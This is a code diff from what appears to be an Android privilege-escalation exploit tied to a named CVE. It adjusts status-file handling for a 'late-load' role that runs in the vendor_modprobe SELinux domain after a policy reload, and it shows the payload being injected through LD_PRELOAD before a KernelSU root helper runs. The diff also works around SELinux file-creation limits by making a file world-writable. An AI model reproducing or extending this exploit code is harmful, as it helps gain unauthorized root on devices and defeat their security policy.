@@ -135,14 +135,22 @@ static unsigned int ksu_version_probe(void) {
 
 static void write_late_load_status(int done, int root, int ksud_rc,
     unsigned int ksu_version) {
-  int fd = open(LATE_LOAD_STATUS, O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC,
-      0644);
-  if (fd >= 0) {
-    dprintf(fd, "done=%d root=%d ksud_rc=%d ksu_version=%u\n",
-        done, root, ksud_rc, ksu_version);
-    fsync(fd);
-    close(fd);
+  /* The late-load role runs in the vendor_modprobe domain, which (post
+   * policy reload) may write existing shell_data_file but not create new
+   * files in /data/local/tmp — the --run-payload role pre-creates the
+   * placeholder from the shell side. Write-without-create first. */
+  int fd = open(LATE_LOAD_STATUS, O_WRONLY | O_TRUNC | O_CLOEXEC);
+  if (fd < 0 && errno == ENOENT)
+    fd = open(LATE_LOAD_STATUS, O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC,
+        0644);
+  if (fd < 0) {
+    mark("late-load status write FAILED: %s", strerror(errno));
+    return;
   }
+  dprintf(fd, "done=%d root=%d ksud_rc=%d ksu_version=%u\n",
+      done, root, ksud_rc, ksu_version);
+  fsync(fd);
+  close(fd);
   mark("late-load status: done=%d root=%d ksud_rc=%d ksu_version=%u",
       done, root, ksud_rc, ksu_version);
 }
@@ -237,8 +245,20 @@ static int do_run_payload(const char *payload, const char *self,
       close(log);
   }
 
-  /* Fresh run: clear any stale post-root status before the payload fires. */
-  unlink(LATE_LOAD_STATUS);
+  /* Fresh run: reset the post-root status to a placeholder. Pre-CREATE the
+   * file here (shell side) — the late-load role runs as vendor_modprobe,
+   * which may write existing files in /data/local/tmp but cannot create
+   * new ones once policy is re-armed. World-writable so either side can
+   * truncate/rewrite. */
+  {
+    int ph = open(LATE_LOAD_STATUS,
+        O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, 0666);
+    if (ph >= 0) {
+      dprintf(ph, "pending\n");
+      fsync(ph);
+      close(ph);
+    }
+  }
 
   setenv("LD_PRELOAD", payload, 1);
   if (!getenv("CVE43499_ROOT_HELPER"))
